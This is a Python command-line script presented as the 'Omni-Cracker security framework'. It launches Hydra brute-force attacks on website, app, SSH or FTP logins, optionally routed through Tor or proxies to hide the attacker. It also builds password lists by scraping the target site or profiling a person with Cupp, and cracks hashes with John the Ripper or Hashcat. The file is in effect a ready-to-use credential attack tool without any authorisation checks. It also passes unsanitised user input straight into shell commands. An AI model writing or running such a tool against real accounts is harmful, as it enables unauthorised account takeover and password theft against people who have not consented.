#!/usr/bin/env python3
import os
import sys
import time

def clear_screen():
    os.system('clear')

def banner():
    print("\033[1;35m")
    print("==================================================")
    print("         OMNI-CRACKER SECURITY FRAMEWORK          ")
    print("   Auto Wordlist + Proxy + Web/App Brute-Force    ")
    print("==================================================")
    print("\033[0m")

def main_menu():
    while True:
        clear_screen()
        banner()
        print("[1] Target Website / App Login Brute-Force (Auto Proxy + Hydra)")
        print("[2] Generate Smart Wordlist (CeWL / Crunch / Cupp)")
        print("[3] Offline Hash Cracker (John / Hashcat)")
        print("[4] Configure & Test Proxy Server")
        print("[5] Check & Install Required Tools (Dependencies)")
        print("[0] Exit")
        
        choice = input("\nSelect an option (0-5): ")
        
        if choice == '1':
            app_or_web_attack()
        elif choice == '2':
            wordlist_menu()
        elif choice == '3':
            hash_crack_menu()
        elif choice == '4':
            proxy_setup()
        elif choice == '5':
            install_dependencies()
        elif choice == '0':
            print("Exiting Omni-Cracker. Stay safe!")
            sys.exit(0)
        else:
            print("[-] Invalid option! Try again.")
            time.sleep(2)

def app_or_web_attack():
    clear_screen()
    print("\033[1;33m[+] WEB & MOBILE APP BRUTE-FORCE MODULE\033[0m")
    target = input("Enter Target Website URL or App API Endpoint: ")
    username = input("Enter Target Username or User file path: ")
    wordlist = input("Enter Wordlist path (e.g., wordlist.txt): ")
    
    use_proxy = input("Do you want to use a Proxy? (y/n): ")
    proxy_cmd = ""
    if use_proxy.lower() == 'y':
        proxy = input("Enter Proxy (e.g., socks5://127.0.0.1:9050 or http://IP:PORT): ")
        proxy_cmd = f" -x {proxy}"

    service = input("Enter Protocol/Service (e.g., http-post-form, ssh, ftp): ")
    
    print("\n[+] Initializing attack securely...")
    cmd = f"hydra -l {username} -P {wordlist}{proxy_cmd} {target} {service}"
    print(f"[Executing]: {cmd}\n")
    os.system(cmd)
    input("\nPress Enter to return to main menu...")

def wordlist_menu():
    clear_screen()
    print("\033[1;33m[+] SMART WORDLIST GENERATOR\033[0m")
    print("[1] CeWL (Scrape words from target Website)")
    print("[2] Crunch (Generate custom character length wordlist)")
    print("[3] Cupp (Social Engineering personal info wordlist)")
    
    sub_choice = input("\nSelect option (1-3): ")
    if sub_choice == '1':
        url = input("Enter Website URL to scrape: ")
        os.system(f"cewl {url} -w scraped_wordlist.txt")
        print("[✔] Wordlist saved as 'scraped_wordlist.txt'")
    elif sub_choice == '2':
        min_l = input("Min length: ")
        max_l = input("Max length: ")
        chars = input("Characters (e.g., abc123): ")
        os.system(f"crunch {min_l} {max_l} {chars} -o crunch_list.txt")
        print("[✔] Wordlist saved as 'crunch_list.txt'")
    elif sub_choice == '3':
        os.system("python3 cupp.py -i")
    
    input("\nPress Enter to return to main menu...")

def hash_crack_menu():
    clear_screen()
    print("\033[1;33m[+] OFFLINE HASH CRACKER\033[0m")
    hash_file = input("Enter Hash file path: ")
    wordlist = input("Enter Wordlist path: ")
    tool = input("Choose tool [1] John the Ripper [2] Hashcat: ")
    
    if tool == '1':
        os.system(f"john --wordlist={wordlist} {hash_file}")
    elif tool == '2':
        mode = input("Enter Hashcat mode (e.g., 0 for MD5, 1000 for NTLM): ")
        os.system(f"hashcat -m {mode} {hash_file} {wordlist}")
        
    input("\nPress Enter to return to main menu...")

def proxy_setup():
    clear_screen()
    print("\033[1;33m[+] PROXY CONFIGURATION & TESTING\033[0m")
    print("1. Tor Proxy (SOCKS5): socks5://127.0.0.1:9050")
    print("Make sure Tor service is running in your Termux/Kali environment.")
    test = input("Do you want to test proxy connection using curl? (y/n): ")
    if test.lower() == 'y':
        proxy = input("Enter Proxy to test: ")
        os.system(f"curl --proxy {proxy} https://api.ipify.org")
    input("\nPress Enter to return to main menu...")

def install_dependencies():
    clear_screen()
    print("\033[1;33m[+] CHECKING & INSTALLING REQUIRED TOOLS\033[0m")
    os.system("apt update && apt install -y hydra cewl crunch john hashcat tor")
    print("\n[✔] Dependency check and installation completed!")
    input("\nPress Enter to return to main menu...")

if __name__ == "__main__":
    main_menu()

